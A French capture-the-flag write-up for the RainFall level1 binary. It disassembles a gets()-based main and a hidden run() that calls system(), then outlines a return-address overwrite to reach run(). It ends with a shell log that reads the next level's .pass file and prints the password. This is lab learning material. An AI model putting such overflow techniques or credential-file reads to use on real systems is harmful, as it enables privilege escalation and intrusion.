# Level1

### Premier etape - tester le binaire

	$ ./level1
	$

	$ ./level1
	$ test


Rien ne se passe alors nous allons objdump -D le binaire pour voir ce qu'il fait exactement

```s
08048480 <main>:
 8048480:	55                   	push   %ebp
 8048481:	89 e5                	mov    %esp,%ebp
 8048483:	83 e4 f0             	and    $0xfffffff0,%esp
 8048486:	83 ec 50             	sub    $0x50,%esp
 8048489:	8d 44 24 10          	lea    0x10(%esp),%eax
 804848d:	89 04 24             	mov    %eax,(%esp)
 8048490:	e8 ab fe ff ff       	call   8048340 <gets@plt>
 8048495:	c9                   	leave  
 8048496:	c3                   	ret    
 8048497:	90                   	nop
 8048498:	90                   	nop
 8048499:	90                   	nop
 804849a:	90                   	nop
 804849b:	90                   	nop
 804849c:	90                   	nop
 804849d:	90                   	nop
 804849e:	90                   	nop
 804849f:	90                   	nop
```

Nous pouvons voir un petit main avec un buffer char de 75 octets qui serra utiliser pour stocker la valeur de retour de la fonction gets(function libc)

Une fois gets executer le programme effectue une serie de no op et se termine.

Conclusion : Le programme stock ce que nous rentrons en prompt avec gets et s'arrete

### INFO
``La fonction gets est une fonction vulnerable permettant les overflow ce qui est extrement dangereux pour le systeme mais pour nous cela est parfait ! ``



### Nous remarquons une autre fonction ecrite mais pas utiliser qui s'appelle run :

```c
08048444 <run>:
 8048444:	55                   	push   %ebp
 8048445:	89 e5                	mov    %esp,%ebp
 8048447:	83 ec 18             	sub    $0x18,%esp
 804844a:	a1 c0 97 04 08       	mov    0x80497c0,%eax
 804844f:	89 c2                	mov    %eax,%edx
 8048451:	b8 70 85 04 08       	mov    $0x8048570,%eax
 8048456:	89 54 24 0c          	mov    %edx,0xc(%esp)
 804845a:	c7 44 24 08 13 00 00 	movl   $0x13,0x8(%esp)
 8048461:	00 
 8048462:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
 8048469:	00 
 804846a:	89 04 24             	mov    %eax,(%esp)
 804846d:	e8 de fe ff ff       	call   8048350 <fwrite@plt>
 8048472:	c7 04 24 84 85 04 08 	movl   $0x8048584,(%esp)
 8048479:	e8 e2 fe ff ff       	call   8048360 <system@plt>
 804847e:	c9                   	leave  
 804847f:	c3                   	ret
```

En lisant ce code nous remarquons tout de suite que cette fonction exécute une commande système dont la chaîne est stockée à l’adresse de retour de fwrite(stdout)

### INFO
``la fonction <run> est un code mallicieux classique proteger aujourd hui par la memoire canari``


### OVERFLOW EIP PANDING

Nous allons proceder a un overflow et calculer combien d'octet ils nous faut pour ecrasser le pointeur d'instruction

``` 
1. print("A"*75) qui est le nombre d'octet du buffer char de gets
2. On ajoute 4 octet par 4 octet de caractere specifique pour atteindre la memoire ret
3. une fois effectuer nous allons soustraire les octets pour injecter au pointeur d'instruction d'adresse de la fonction <RUN>
```

nous n'avons plus qu'a creer un programme python qui ferra cette etape pour nous pour injecter le code mallicieux dans le dossier sources

```b
$level1@RainFall:/tmp$ (python ./exploit.py; cat) | ~/level1
Good... Wait what?
$id
uid=2030(level1) gid=2030(level1) euid=2021(level2) egid=100(users) groups=2021(level2),100(users),2030(level1)
$cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```



et OP ! nous avons un terminal ouvert dont l'euid est level2 !
gg wp.